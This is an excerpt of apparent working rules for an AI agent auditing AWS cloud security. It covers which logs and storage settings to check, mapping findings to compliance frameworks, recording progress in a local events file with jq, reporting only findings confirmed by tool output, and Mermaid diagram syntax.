- **Validate logging at every layer** — CloudTrail management + data events, VPC Flow Logs, S3 access logs, GuardDuty
- **Test storage at object level** — bucket-level checks are insufficient; enumerate object ACLs, versioning, encryption per-object
- **Include compliance mapping** — every finding must reference applicable SOC 2, PCI DSS, HIPAA, and CIS controls
- **Use `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` liberally** — document what resources were checked and their status
- **Never fabricate findings** — only report what tool output confirms
- **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
- Call `# (no-op — tools native on Kali)` at the end if `Bash(...)` was used
